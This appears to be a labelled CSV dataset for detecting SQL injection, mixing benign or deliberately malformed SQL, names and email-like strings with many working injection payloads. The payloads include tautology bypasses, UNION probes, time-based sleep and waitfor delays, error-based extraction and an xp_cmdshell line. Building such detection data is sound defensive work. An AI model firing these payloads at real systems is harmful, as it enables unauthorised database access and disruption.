Query,Label
"SELECT cheeseID AS ID, obtain AS fed FROM stay",0
"1"" ) as crek where 6570 = 6570 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
SELECT * FROM price WHERE choice LIKE '%wrapped%',0
1'|| ( select 'kuxp' where 7123 = 7123 and 1688 = 4200#,1
"1"" ) ) as rhea where 2982 = 2982 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",1
"1' ) ) as sojl where 8710 = 8710 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
albero bajo,0
"SELECT showID AS ID, immediately AS brave FROM warn",0
"SELECT Employees.almost, COUNT ( Orders.largeID ) AS miceFROM ( OrdersINNER JOIN powerful ON Orders.dishID = Employees.didID )",0
fabrelle,0
SELECT * FROM bet WHERE NOT mean = 'organization' AND NOT condition = 'cutting',0
paleogrfico,0
"1 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"1"" ) or sleep ( 5 ) and ( ""fiag"" like ""fiag",1
SELECT TOP 50 PERCENT * FROM temperature,0
s-ierro,0
"-5996 ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1
SELECT COUNT ( DISTINCT sport ) FROM full,0
"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'cssb' = 'cssb",1
or ''&',1
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ""vqpx"" like ""vqpx",1
incrdu69,0
SELECT * FROM planet WHERE nest = 'steam' LIMIT 3,0
1'+ ( select qsmo where 3172 = 3172,1
"SELECT column_name ( s ) FROM garden,bone",0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual ) +'",1
roccardi.betten@carrillo-de-albornoz.mil,0
SELECT AVG ( they ) FROM particularly,0
chavis,0
"1' where 6721 = 6721 union all select null,null,null,null,null,null,null,null,null,null#",1
"1"" where 7290 = 7290 union all select null,null,null,null,null,null,null--",1
"1"" ) as vzdq where 3160 = 3160",1
SELECT * FROM relationship,0
SELECT * FROM hope FETCH FIRST 3 ROWS ONLY,0
"1' ) as ywtu where 3009 = 3009 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ""ikhr"" = ""ikhr",1
SELECT AVG ( pony ) FROM lips SELECT SUM ( older ),0
graciot ballv,0
"1"" and 4288 = 3696 and ""qqam"" like ""qqam",1
SELECT very ( s FROM slightly RIGHT JOIN,0
SELECT * FROM cream 3 SELECT * FROM cloth,0
select * from users where id = 1 or \<\. or 1 = 1 -- 1,1
"1 ) as agex where 8167 = 8167 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1
"1 ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",1
"c/ fancelli, 34 6b",0
1' ) as wquy where 2518 = 2518,1
or 1 = 1 /*,1
SELECT * FROM ( SELECT machinery FROM fog ),0
"1' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'ibav' = 'ibav",1
4631,0
"-6815 where 7609 = 7609 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
"-7482%"" ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,1
afoscarse,0
select ( case when ( 1014 = 4280 ) then 1014 else 1014* ( select 1014 from mysql.db ) end ) #,1
36914497a,0
1' where 2183 = 2183,1
1'|| ( select 'bzxa' where 6320 = 6320,1
pagny@cpanelweb.yu,0
"1%' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( '%' = '",1
SELECT * FROM fierce WHERE valley NOT LIKE '[can]%',0
1' ) and ( 1471 = 7892 ) *7892 and ( 'kkok' like 'kkok,1
"1"" ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( ""zoag"" like ""zoag",1
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'oskf' like 'oskf",1
"UPDATE which SET tower = 'gone', City = 'record' WHERE gate = hospital",0
SELECT MIN ( tide ) AS thumb FROM straight,0
SELECT * FROM garden WHERE bear NOT LIKE '[hill]%',0
SELECT * FROM silent WHERE immediately = 'spite',0
SELECT student ( s ) FROM ball UNION,0
"SELECT toward, type, flag FROM idea WHERE dinner IS NULL",0
SELECT * FROM ( SELECT basic FROM ever ),0
SELECT * FROM laid WHERE pilot BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT AVG ( official ) FROM body,0
SELECT AVG ( curve ) FROM cat SELECT SUM ( read ),0
"1 and elt ( 8853 = 1675,1675 ) -- jegm",1
SELECT * FROM them ORDER BY anyway DESC,0
yescas feal,0
ivon,0
"iif ( 3204 = 8489,3204,1/0 )",1
end and ( ( ( 3673 = 3673,1
"SELECT stared AS else, poetry AS [sand] FROM split",0
SELECT * FROM done WHERE center = 'forty',0
SELECT test ( s ) FROM desert SELECT mysterious FROM sides,0
1 ) where 8433 = 8433 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,1
"-5910%' ) ) ) union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",1
"admin"" ) or ( ""1"" = ""1""#",1
4358,0
"1%' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
SELECT TOP 3 * FROM printed SELECT * FROM watch 3SELECT * FROM believed,0
"SELECT COUNT ( studying ) , program FROM score BY former",0
8623,0
"1"" ) ) ) and 9198 = 9198--",1
1' ) as ihsc where 3978 = 3978,1
leopolda,0
"SELECT * FROM official ORDER BY corn ASC, taken DESC",0
CHAR(39) OR CHAR(49)=CHAR(49),1
SELECT * FROM me WHERE affect = 'percent',0
childree,0
"-7138"" union all select 2341,2341,2341,2341--",1
SELECT AVG ( sit ) FROM terrible SELECT SUM ( mass ),0
"1%"" ) ) and sleep ( 5 ) and ( ( ""%"" = """,1
"1', ( select ( case when ( 4209 = 5879 ) then 1 else 4209* ( select 4209 from information_schema.character_sets ) end ) )",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 30710 ) ORDER BY meta_id ASC",0
SELECT AVG ( sure ) FROM belt SELECT SUM ( half ),0
97,0
SELECT eleven ( s FROM nothing RIGHT JOIN,0
masapati,0
more@soymuyguapa.es,0
SELECT COUNT ( DISTINCT receive ) FROM experiment,0
07383536f,0
DELETE FROM rhyme,0
SELECT * FROM becoming ORDER BY chain DESC,0
"select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",1
"UPDATE dinner SET correctly = 'smoke', City = 'closer' WHERE action = wash",0
"-8355%"" ) ) ) union all select 3004,3004,3004,3004,3004,3004,3004--",1
"-4381 or make_set ( 6118 = 3095,3095 ) # lkcr",1
1'+ ( select 'qbdh' where 4006 = 4006 and 7533 = 7533 ) +',1
select ( case when ( 5085 = 4259 ) then 5085 else 5085* ( select 5085 from mysql.db ) end ) #,1
"SELECT * FROM private WHERE cast NOT IN ( 'those', 'roar', 'crowd' )",0
"SELECT * FROM summer WHERE stuck BETWEEN ""friendly"" AND ""tiny""",0
"1"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""bmbg"" like ""bmbg",1
"select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1
SELECT * FROM either WHERE they = 'cat' AND City = 'ahead',0
SELECT * FROM cream,0
"1"" ) as kfvy where 7305 = 7305 or sleep ( 5 ) --",1
SELECT * FROM surface WHERE trap = 'iron',0
"1"" ) as qnmd where 5642 = 5642",1
SELECT * FROM us WHERE zoo BETWEEN '1996-07-01' AND '1996-07-31',0
urrupan moger,0
"select * from users where id = 1 union select .1_,version ( ) -- 1",1
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'osov' like 'osov",1
SELECT * FROM fireplace WHERE brick IN ( SELECT green FROM type ),0
1' where 6533 = 6533,1
"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",1
"1' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'novq' = 'novq",1
"SELECT SUBDATE ( ""2017-06-15"", INTERVAL -2 MONTH ) ;",0
"calle san millan, 148, 6?e",0
SELECT * FROM mouth FETCH FIRST 50 PERCENT ROWS ONLY,0
95937804c,0
"1"" ) ) order by 1--",1
SELECT MIN ( poem ) AS gave FROM such,0
SELECT COUNT ( beside ) FROM lungs,0
n4que,0
SELECT * FROM capital WHERE grabbed = 'fighting' LIMIT 3,0
1'|| ( select 'jlon' where 1461 = 1461,1
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",1
SELECT * FROM riding WHERE jungle = zoo,0
-8828 ) ) as ospo where 2141 = 2141 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1
"SELECT tomorrow, speak, plastic FROM particular WHERE upper IS NULL",0
steele-kripilani@vendomiatico.se,0
SELECT option_value FROM wp_options WHERE option_name = 'user_registration_email_setting_disable_email' LIMIT 1,0
-6015%' ) order by 1--,1
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",1
SELECT * FROM post ORDER BY swimming DESC,0
SELECT AVG ( mix ) FROM write SELECT SUM ( harder ),0
SELECT central,0
SELECT * FROM imagine,0
"1%"" or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
9.70863E+15,0
1 ) ) as rbcf where 1053 = 1053,1
"1' ) as ghks where 5128 = 5128 union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT AVG ( front ) FROM gather SELECT SUM ( directly ),0
"1'|| ( select 'yrau' where 7860 = 7860 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",1
2.53246E+15,0
SELECT * FROM eat WHERE NOT hope = 'sugar' AND NOT bone = 'grass',0
SELECT COUNT ( surfaceID ) FROM mine,0
SELECT * FROM discussion WHERE brass = 'stage' AND ( plural = 'men' OR gray = 'purple' ),0
1' ) as tvqn where 2967 = 2967,1
select sleep ( 5 ) and ( 'qcsv' = 'qcsv,1
"1 ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )",1
UPDATE period SET search = 'problem'WHERE forth = 'oil',0
SELECT * FROM ( SELECT laugh FROM situation ),0
mara,0
"-6475"" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""mdsx"" like ""mdsx",1
"-2982' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'iqwn' = 'iqwn",1
"1"" and make_set ( 6520 = 9958,9958 )",1
8.17915E+15,0
1' ) where 5616 = 5616,1
"SELECT trace AS shade, suggest AS [later] FROM aware",0
"-3632' or make_set ( 9354 = 9354,7185 ) and 'lgpy' like 'lgpy",1
"1 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) # jmki",1
SELECT CEIL ( 25.75 ) ;,0
%u0027 OR 1=1,1
"1' ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
SELECT COUNT ( topicID ) FROM grandmother,0
5.41816E+15,0
SELECT * FROM tea WHERE gulf NOT LIKE '[explanation]%',0
bolkan@directoriogratuito.int,0
cojera,0
1.35689E+15,0
"1' ) where 4778 = 4778 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
1%' ) ) ) waitfor delay '0:0:5'--,1
SELECT * FROM broke WHERE choice = 'touch' LIMIT 3,0
espa7t4ro,0
coppin@sexl.no,0
SELECT AVG ( sort ) FROM term SELECT SUM ( signal ),0
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
1' where 1045 = 1045 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,1
SELECT * FROM low WHERE thee NOT BETWEEN 'enjoy' AND 'factor',0
"1"" where 1537 = 1537 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1
-8032%' ) ) ) or 9323 = 9323#,1
SELECT * FROM putting FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM human,0
SELECT plastic ( s ) FROM six,0
select pg_sleep ( 5 ) and ( '%' = ',1
"SELECT islandID AS ID, skin AS because FROM thousand",0
quest@palmatraducciones.pw,0
"1', ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",1
"1"" ) ) as rign where 1604 = 1604 and 3661 = 3054--",1
-6203' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'luee' = 'luee,1
-7430' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1
"1' ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'ygfv' = 'ygfv",1
"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",1
SELECT * FROM sit WHERE teach = 'rock',0
SELECT window,0
select * from users where id = 1 + ( 1 ) or 1 = 1 -- 1,1
"-3261"" ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""yxms"" = ""yxms",1
1 ) ) as pjkd where 1105 = 1105 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1
"select * from generate_series ( 3180,3180,case when ( 3180 = 4445 ) then 1 else 0 end ) limit 1--",1
1'+ ( select ohqr where 5610 = 5610,1
rigau amer,0
oti sineiro,0
SELECT CEIL ( 25 ) ;,0
"1"" where 2394 = 2394 and 8831 = 8333--",1
waitfor delay '0:0:5' and ( ( 'nvqf' = 'nvqf,1
"SELECT DATE_ADD ( ""2017-06-15"", INTERVAL 10 DAY ) ;",0
aizpuru cerusoli,0
SELECT label ( s ) FROM grown FULL OUTER JOIN,0
"select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",1
"-5698' ) ) as egjr where 5586 = 5586 union all select 5586,5586,5586--",1
agam1,0
campillo,0
"plaza minayo, 2",0
"-1031%"" union all select 6832,6832,6832,6832#",1
"1, ( select ( case when ( 5726 = 5275 ) then 1 else 1/ ( select 0 ) end ) )",1
SELECT AVG ( draw ) FROM help SELECT SUM ( chart ),0
1'+ ( select ahyw where 6893 = 6893 waitfor delay '0:0:5'--,1
FROM ( SELECT DISTINCT band FROM page ),0
wahlberg8@am-si.np,0
enco,0
-5067' ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'vkab' like 'vkab,1
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""mkal"" like ""mkal",1
SELECT * FROM peace WHERE outline = 'scared' FETCH FIRST 3 ROWS ONLY,0
terry@mtos.ar,0
"SELECT include,corner,first FROM thin LEFT JOIN Orders ON tongue.freshID = young.class ORDER BY everywhere.flew",0
select ( case when ( 6839 = 2730 ) then 6839 else 6839* ( select 6839 from mysql.db ) end ) #,1
""" or """" """,1
SELECT COUNT ( wheel ) FROM lying,0
-7874 ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 2817 = 2817,1
"SELECT * FROM turn ORDER BY offer, hat",0
SELECT * FROM without WHERE managed = 'higher' OR stick = 'biggest',0
jackelyn,0
SELECT * FROM father WHERE situation LIKE '%belong%',0
"-7236 or make_set ( 9618 = 6919,6919 )",1
armintario,0
SELECT AVG ( know ) FROM toward,0
SELECT * FROM shut WHERE larger NOT LIKE 'full%',0
"INSERT INTO thy ( open, even, stand ) VALUES ( 'today', 'connected', 'above' )",0
"SELECT anyID AS ID, atom AS beautiful FROM dry",0
48748000y,0
"1%' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '",1
firat6,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c83ee379f0' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
63eb2ya,0
DELETE FROM stared WHERE system = 'whole',0
1' ) ) as jzoh where 6484 = 6484 and 7364 = 4233--,1
"1"" ) as ivuv where 5691 = 5691",1
SELECT * FROM select WHERE to = current,0
"-2518' union all select 6818,6818,6818,6818,6818,6818#",1
8.79E+15,0
SELECT * FROM gain,0
"1'+ ( select 'suzs' where 2905 = 2905 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) +'",1
99783130e,0
"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1
""" ) ) or pg_sleep ( __TIME__ ) --",1
"select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1",1
"-5959"" or 2477 = 1144",1
SELECT * FROM comfortable WHERE driven NOT LIKE '[read]%',0
1' ) ) ) rlike ( select ( case when ( 4076 = 4881 ) then 1 else 0x28 end ) ) and ( ( ( 'grzs' = 'grzs,1
rashmi,0
pg_sleep ( __TIME__ ) --,1
SELECT AVG ( Price ) FROM man,0
SELECT * FROM threw WHERE appropriate BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM understanding FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM during,0
"SELECT factor,tightly FROM log WHERE make = 'roar' UNION SELECT salt, heading FROM most",0
UPDATE return SET camera = 'pond'WHERE of = 'such',0
1 ) as sdnd where 9472 = 9472,1
leiro,0
select * from users where id = 1 or $<\. or 1 = 1 -- 1,1
SELECT tin ( s ) FROM score UNION ALL,0
"-4054"" or 2824 = 4788--",1
ulf,0
"1' ) where 9454 = 9454 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
or pg_sleep ( __TIME__ ) --,1
SELECT * FROM mighty,0
SELECT * FROM age WHERE planet NOT LIKE '[bee]%',0
SELECT MIN ( making ) AS minerals FROM plural,0
-8652' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1
"-4550"" ) as hlwe where 6026 = 6026 or ( 9364 = 9593 ) *9593--",1
SELECT * FROM trap FETCH FIRST 50 PERCENT ROWS ONLY,0
"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""ygzq"" like ""ygzq",1
piggott@firstchoicecoffee.gq,0
SELECT * FROM hide WHERE NOT animal = 'outside',0
"1' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"-6200' ) ) as jjpz where 4490 = 4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",1
de1l2nda9ur4,0
"-2901"" or elt ( 9866 = 9099,9099 ) and ""asib"" like ""asib",1
1'+ ( select 'ohdf' where 7878 = 7878 and 5678 = 3277--,1
albuminmetro,0
"select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",1
1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 'cmqe' like 'cmqe,1
"1'+ ( select llcl where 8188 = 8188 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"{""$or"": [{""username"": ""admin""}, {""password"": ""admin""}]}",1
"-9630%"" union all select 8592,8592,8592,8592--",1
1' where 7176 = 7176,1
; or '1' = '1',1
SELECT printed ( s ) FROM verb FULL OUTER JOIN,0
1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1
"1' in boolean mode ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) #",1
